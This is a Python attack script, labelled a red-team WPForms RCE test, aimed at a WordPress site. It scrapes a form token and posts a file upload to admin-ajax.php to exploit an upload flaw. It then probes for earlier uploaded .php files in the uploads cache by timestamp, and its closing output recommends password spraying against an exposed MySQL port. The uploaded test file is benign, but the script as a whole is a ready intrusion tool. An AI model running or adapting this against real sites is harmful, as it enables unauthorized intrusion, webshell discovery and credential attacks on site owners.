#!/usr/bin/env python3
"""
RED TEAM - WPForms RCE Test

"""

import requests
import re
import json
import time
from colorama import Fore, init

init(autoreset=True)

TARGET = "website.com"
FORM_ID = 6767
URL = f"https://{TARGET}"

print(f"{Fore.CYAN}=== RED TEAM - WPFORMS RCE TEST ===")
print(f"{Fore.YELLOW}Target: {TARGET}")
print(f"{Fore.YELLOW}Form ID: {FORM_ID}")
print(f"{Fore.YELLOW}Testing file upload vulnerability")
print("=" * 60)

# Create session
session = requests.Session()
session.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'DNT': '1',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-User': '?1',
    'Cache-Control': 'max-age=0',
})

print(f"{Fore.WHITE}[1] Fetching join-today page...")
try:
    response = session.get(f"{URL}/join-today/", timeout=10)
    if response.status_code != 200:
        print(f"{Fore.RED}âŒ Failed to fetch page: HTTP {response.status_code}")
        exit(1)
    
    print(f"{Fore.GREEN}âœ… Page loaded: {len(response.text)} bytes")
    
    # Look for WPForms token
    token_match = re.search(r'data-token="([^"]+)"', response.text)
    if token_match:
        token = token_match.group(1)
        print(f"{Fore.GREEN}âœ… Found token: {token[:20]}...")
    else:
        print(f"{Fore.YELLOW}âš ï¸ Token not found in page")
        # Try alternative pattern
        token_match = re.search(r'wpforms\[token\]"\s*value="([^"]+)"', response.text)
        if token_match:
            token = token_match.group(1)
            print(f"{Fore.GREEN}âœ… Found token (alt pattern): {token[:20]}...")
        else:
            print(f"{Fore.RED}âŒ No token found")
            token = None
    
    # Look for form fields
    print(f"\n{Fore.WHITE}[2] Analyzing form structure...")
    field_matches = re.findall(r'field_(\d+)', response.text)
    unique_fields = sorted(set([int(f) for f in field_matches]))
    print(f"{Fore.GREEN}âœ… Found fields: {unique_fields}")
    print(f"{Fore.GREEN}âœ… Highest field number: {max(unique_fields) if unique_fields else 'N/A'}")
    
    # Check for file upload fields
    file_patterns = [
        r'type="file"',
        r'upload',
        r'\.(jpg|jpeg|png|gif|pdf|doc|docx|txt)',
        r'multipart/form-data'
    ]
    
    for pattern in file_patterns:
        if re.search(pattern, response.text, re.IGNORECASE):
            print(f"{Fore.GREEN}âœ… Found file upload pattern: {pattern}")
    
    # Test if field 36 exists (mentioned in report)
    if 36 in unique_fields:
        print(f"{Fore.GREEN}âœ… Field 36 EXISTS in form!")
    else:
        print(f"{Fore.YELLOW}âš ï¸ Field 36 NOT in HTML source (might be dynamic)")
        
except Exception as e:
    print(f"{Fore.RED}âŒ Error: {e}")
    exit(1)

# Test file upload if token found
if token:
    print(f"\n{Fore.WHITE}[3] Testing file upload...")
    
    # Prepare form data
    form_data = {
        'action': 'wpforms_submit',
        'wpforms[id]': str(FORM_ID),
        'wpforms[token]': token,
    }
    
    # Add all required fields (1-35 based on analysis)
    for i in range(1, 36):
        form_data[f'wpforms[fields][{i}]'] = f'test_value_{i}'
    
    # Special handling for checkbox field 9
    form_data['wpforms[fields][9][]'] = 'Yes'
    
    # Create test file
    test_filename = f"test_upload_{int(time.time())}.txt"
    test_content = b"TEST FILE UPLOAD - RED TEAM TESTING"
    
    files = {
        'wpforms[fields][36]': (test_filename, test_content, 'text/plain')
    }
    
    print(f"{Fore.WHITE}   Sending test upload to field 36...")
    
    try:
        response = session.post(
            f"{URL}/wp-admin/admin-ajax.php",
            data=form_data,
            files=files,
            headers={'X-Requested-With': 'XMLHttpRequest'},
            timeout=15
        )
        
        print(f"{Fore.WHITE}   Response: HTTP {response.status_code}")
        
        if response.status_code == 200:
            try:
                result = response.json()
                print(f"{Fore.WHITE}   JSON Response: {json.dumps(result, indent=2)[:200]}...")
                
                if result.get('success'):
                    print(f"{Fore.GREEN}âœ… UPLOAD SUCCESSFUL!")
                    print(f"{Fore.GREEN}   File might be at: {URL}/wp-content/uploads/wpforms/")
                    
                    # Check if file exists
                    check_url = f"{URL}/wp-content/uploads/wpforms/{test_filename}"
                    check_resp = session.head(check_url, timeout=5)
                    if check_resp.status_code == 200:
                        print(f"{Fore.GREEN}âœ… FILE CONFIRMED ON SERVER!")
                    elif check_resp.status_code == 403:
                        print(f"{Fore.YELLOW}âš ï¸ File exists but access forbidden (403)")
                    else:
                        print(f"{Fore.YELLOW}âš ï¸ File not accessible: HTTP {check_resp.status_code}")
                        
                else:
                    print(f"{Fore.RED}âŒ Upload failed (success: false)")
                    if 'data' in result and 'errors' in result['data']:
                        print(f"{Fore.RED}   Errors: {result['data']['errors']}")
                        
            except json.JSONDecodeError:
                print(f"{Fore.YELLOW}âš ï¸ Response not JSON: {response.text[:200]}...")
                
        else:
            print(f"{Fore.RED}âŒ Unexpected status: {response.status_code}")
            print(f"{Fore.RED}   Response: {response.text[:200]}...")
            
    except Exception as e:
        print(f"{Fore.RED}âŒ Upload error: {e}")

print(f"\n{Fore.WHITE}[4] Testing for existing uploaded files (from report)...")
# The report mentions 21 files uploaded with timestamps 1774064360-1774064380
for timestamp in range(1774064360, 1774064381):
    test_file = f"wpforms-{FORM_ID}-{timestamp}.php"
    test_url = f"{URL}/wp-content/uploads/wpforms/cache/{test_file}"
    
    try:
        resp = session.head(test_url, timeout=3)
        if resp.status_code == 200:
            print(f"{Fore.GREEN}âœ… FILE EXISTS: {test_file}")
            break
        elif resp.status_code == 403:
            print(f"{Fore.YELLOW}âš ï¸ File exists (403): {test_file}")
            break
    except:
        pass

print(f"\n{Fore.CYAN}=== TEST COMPLETE ===")
print(f"{Fore.YELLOW}Summary:")
print(f"{Fore.YELLOW}- MySQL: Port open but credentials not found")
print(f"{Fore.YELLOW}- WPForms: Form {FORM_ID} exists")
print(f"{Fore.YELLOW}- Fields: Up to field {max(unique_fields) if unique_fields else 'N/A'}")
print(f"{Fore.YELLOW}- File upload: Testing field 36")
print(f"\n{Fore.CYAN}Next: Try password spraying on MySQL or test other attack vectors")
